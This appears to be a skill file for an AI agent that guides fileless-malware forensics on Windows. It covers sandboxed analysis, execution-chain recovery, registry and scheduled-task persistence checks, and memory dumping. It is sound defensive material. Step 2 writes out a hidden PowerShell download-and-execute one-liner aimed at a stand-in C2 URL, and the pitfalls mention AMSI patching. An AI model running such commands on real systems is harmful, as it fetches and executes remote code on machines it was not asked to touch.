---
name: re-fileless
description: >
  Fileless malware: in-memory execution, persistence, and PowerShell chains.
  Triggers: `无文件`, fileless, `内存执行`, `PowerShell 无文件`, `注册表持久化`
capabilities: [malware-behavior]
---

# Fileless malware analysis

## When to use / when not to use

- Use: the sample does not land on disk (fileless) — in-memory execution, PowerShell download-and-execute, WMI/scheduled tasks, a registry Run key carrying the payload
- Use: answer the three chains "how the fileless payload got in, how it executed, how it persisted"
- Use: AV/EDR alerts that have only behavior and network signatures and no file evidence (joins the AMSI/ETW countermeasures in [[re-evasion]])
- Do not use: ordinary behavior analysis of a sample that did land on disk (that is [[re-behavior]]); pure static script decoding (that is [[re-script-deob]])
- Do not use: analyzing only the payload body and not the execution chain (hand off to [[re-binary-core]] / [[re-shellcode]])
- Note: this skill is mainly Windows (fileless / registry / WMI / scheduled tasks are all the Windows ecosystem); the Linux/macOS counterparts (bash/python in-memory execution, LD_PRELOAD, systemd timer/crontab) use the same "recover the execution chain" frame

## Tool setup

Fileless analysis = dynamic execution + memory forensics + script decoding in parallel, entirely inside a sandbox ([[re-sandbox]] is a mandatory precondition, [[re-analyze/platform-tips]] highest principle). Verify every tool before use.

### Dynamic-analysis environment (mandatory precondition)

- [[re-sandbox]]: VM snapshot + network isolation (INetSim / fake DNS / cut the network) — a fileless sample often calls out in real time to download the next stage; isolation must come first
- [[re-tracing]]: syscall/process-behavior tracing (Windows procmon / Linux strace)
- Verify: inside the sandbox, `ping 8.8.8.8` does not connect; procmon/strace can record sample-process events

### Memory dump and extraction (joins [[re-memdump]])

- gcore (Linux) / procdump (Windows): prefer an existing dump; see the [[re-analyze/platform-tips]] "direct read vs dump" decision table
- Verify: `gcore --help` (install is in [[re-memdump]] Tool setup); on Windows, Sysinternals procdump (inside the `choco install sysinternals` suite)

### PowerShell analysis (joins [[re-script-deob]])

- pwsh: built into Windows; Linux: `apt install powershell` (Microsoft repo) or `snap install powershell`; macOS: `brew install --cask powershell`
- Verify: `pwsh --version`; static-decode details (-enc decode, IEX chain, AST extraction) are in [[re-script-deob]]

### Sysinternals suite (main Windows behavior and persistence tools)

- `choco install sysinternals` (procmon / Process Explorer / autoruns / procdump)
- Verify: running Procmon64.exe as administrator can record events; `autorunsc64.exe -a * -c` can export every startup item
- Supplement (optional): Sysmon (download from the Microsoft site) configured for ProcessCreate (event 1, records parent process + command line) and NetworkConnect (event 3)

### Built-in Windows commands (zero install)

- `reg query` (Run keys), `schtasks /query /fo csv /v` (scheduled tasks), `Get-WinEvent` (PowerShell event 4104 ScriptBlock log), `netstat -ano` (callbacks)
- Linux/macOS side: `ps -ef --forest`, `systemctl list-timers`, `crontab -l`, `cat /proc/<pid>/maps`

## Procedure

Run in order. Archive each step's products (dumps/logs/recovered scripts) with sha256 + path (the [[re-ioc]] evidence-chain requirement).

1. **Identify fileless signs (no on-disk / registry-borne payload)**:
   - Input signals: an AV/EDR alert "behavior detection, fileless"; after a sandbox run there is no new sample on disk but the process is abnormal; the network layer shows powershell/rundll32 downloading in real time
   - Static leads: the mail/URL attachment is .ps1/.hta/.docm (a script chain); a registry Run key or scheduled task points at a powershell/wscript/mshta command line rather than an exe path
   - Evidence collection: run inside a sandbox ([[re-sandbox]]) → procmon records files/registry/processes in full → turn on PowerShell ScriptBlock logging (event 4104) and module logging in advance → take a [[re-memdump]] baseline dump before start (see pitfall 2 for timing)
   - Call: "fileless" = the payload does not land on disk, or only transits briefly in %TEMP% — insufficient disk evidence does not mean there is no execution chain; memory and the command line are the main battlefield

2. **Recover the in-memory execution chain (WMI / scheduled task / PowerShell download-and-execute)**:
    ```sh
    # PowerShell 下载执行（最典型）
    powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')"
    # 无文件执行的等价形式: rundll32 / mshta / regsvr32 加载脚本引擎
    # 还原方法: procmon 按进程树过滤（父→子），命令行逐个记录
    ```
   - Chain recovery order: entry (macro/URL/mail attachment) → downloader (PowerShell/WMI fetch) → decode (peel with [[re-script-deob]]) → memory injection (VirtualAlloc + WriteProcessMemory + CreateThread) or reflective load of a .NET assembly
   - Walk each layer's command line: parent PID → child command line → URL/registry key accessed — one chain, one record
   - WMI special case: `wmic process call create "..."` or a WMI event subscription (__EventFilter/__EventConsumer pair) — the parent is WmiPrvse.exe, and the command line is not in the ordinary process tree; enumerate subscriptions with `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter` and `__EventConsumer`, and correlate the process chain with Sysmon event 1
   - Scheduled-task variant: `schtasks /create ...` registers a task whose Action is a powershell -enc string — the command line itself carries the payload; decode it directly to get the next layer

3. **Locate registry / scheduled-task persistence**:
    ```sh
    # 运行键（HKCU/HKLM Run 全家）
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
    reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /s
    # 计划任务（全量含隐藏项）
    schtasks /query /fo LIST /v
    # 自启动服务与 WMI 事件订阅（隐蔽持久化位）
    sc query type= all
    ```
   - autoruns in one pass: `autorunsc64.exe -a * -c` exports every startup point, then filter by "command lines that contain powershell/wscript/mshta/URL" — the shared signature of fileless persistence: the startup command is a script engine + a remote URL/encoded string, not an exe path
   - Hidden scheduled-task pitfall: a malicious task often sets a hidden flag (SD deletes permissions / `/sc onlogon` and no user-visible name) — you must export the full `/fo LIST /v` and compare by hand; do not look only at the default list view
   - Timeline: align the registry key LastWriteTime with task creation time and alert time, to corroborate the same intrusion

4. **Extract the in-memory payload ([[re-memdump]] timing)**:
   - Golden window: on the download → decode → inject chain, **after injection and before execution** (VirtualAlloc has returned + WriteProcessMemory has finished writing, before CreateThread starts) — the memory then holds the most complete plaintext payload
   - Operation: dynamic debug (break at the injection point in [[re-gdb]] / [[re-x64dbg]]) or follow [[re-memdump]] prefer-an-existing-dump — after a full gcore dump, search by signature (MZ header / entropy block / script text)
   - Fileless script payload: search memory directly for script signatures (`IEX`, `FromBase64String`, `DownloadString`, a long base64 string) → after extraction, recover with [[re-script-deob]]
   - Archive the extracted payload with sha256 immediately, then look at "when it will be released" — a payload that is released as soon as it finishes executing is gone if you miss the window (see pitfall 2)

5. **Cross-check with behavior analysis ([[re-behavior]])**:
   - Hand the execution chain recovered in steps 2-4 to [[re-behavior]] for behavior-side verification: process tree / injection / persistence inventory / network connections + ATT&CK mapping (T1059.001 PowerShell, T1055 process injection, T1547.001 registry Run key, T1053.005 scheduled task)
   - Cross-check points: (1) command-line evidence matches the behavior log (who started whom, when the injection happened) (2) the in-memory payload matches the network download (sha256 alignment) (3) the persistence location matches reboot behavior (rerun and verify before snapshot restore)
   - Output: a complete execution chain (entry → download → decode → inject → persist) + payload samples (memory extracts) + IOCs (URL/domain/registry key/command-line pattern) → [[re-ioc]] writes YARA (memory signatures first)

## Cross-domain joins

- [[re-sandbox]]: dynamic execution is a mandatory precondition (the base of every run step in this skill)
- [[re-tracing]]: process/API observation of the execution chain (procmon/strace)
- [[re-memdump]]: in-memory payload extraction (prefer an existing dump; timing is the key)
- [[re-script-deob]]: layer-by-layer decode of the PowerShell download-and-execute chain (called directly by steps 2/4 of this skill)
- [[re-behavior]]: behavior-side cross-check and ATT&CK mapping (step 5 of this skill)
- [[re-evasion]]: AMSI/ETW bypass, AV memory-scan countermeasures (fileless samples often stack these; see pitfall 4)
- [[re-shellcode]]: a pure-code payload extracted from memory (not a script shape) goes to dedicated shellcode analysis
- [[re-netcap]] / [[re-protocol]]: C2 traffic capture and protocol recovery of the download-and-execute chain
- [[re-ioc]]: IOC collection for a fileless payload (memory signatures / command-line patterns / registry keys)
- Cites the [[re-analyze/platform-tips]] highest principle (default sandbox) and the "direct read vs dump" decision table

## Common pitfalls

- **No on-disk file makes forensics hard**: Symptom — the sample file cannot be found on disk, the report says "no physical evidence", and the conclusion will not stand; cause — the payload lived entirely in memory / a remote script / a registry Run key, and ordinary file forensics cannot catch it; fix — before the run, take a full [[re-memdump]] baseline dump + procmon/Sysmon records of the command line and network + turn on PowerShell 4104 logging; the conclusion rests on memory evidence + command line + network flow; [[re-ioc]] collects memory-hash-class signatures (same family as the fileless-forensics pitfall in [[re-evasion]])
- **In-memory payload dump timing (released as soon as execution finishes)**: Symptom — the payload is not in the dmp, or only a fragment is; cause — a fileless payload "injects, executes, then releases/self-clears"; a dump that is too early (not yet decoded) or too late (already released) gets nothing; fix — dump after injection and before execution (the golden window in step 4); dump once at several times; save a complete payload the moment you see it ([[re-memdump]] pitfall: save decrypted data the moment you see it)
- **PowerShell obfuscation chains are multi-layer**: Symptom — unwrapping one layer reveals another, and the more you unwrap the more there is; cause — a download-and-execute chain often stacks encodings (base64 + concatenation + reversal + variable substitution); fix — peel layer by layer per [[re-script-deob]], and archive each layer with a number (layer_01 → layer_02…); after unwrapping, rerun identification; do not skip layers; inside the sandbox, replace IEX with Write-Host to take the next layer
- **AV memory-scan countermeasures**: Symptom — inside the sandbox the sample disappears right after injection / behavior is abnormal, and the full execution chain cannot be observed; cause — AV/EDR memory scan or AMSI hits at injection/execution and clears the payload; fix — inside the sandbox, confirm the countermeasure point per [[re-evasion]] first (AMSI patch / memory-scan timing); if needed, downgrade or disable the in-sandbox AV and rerun (snapshot rollback); note the verification environment on the conclusion
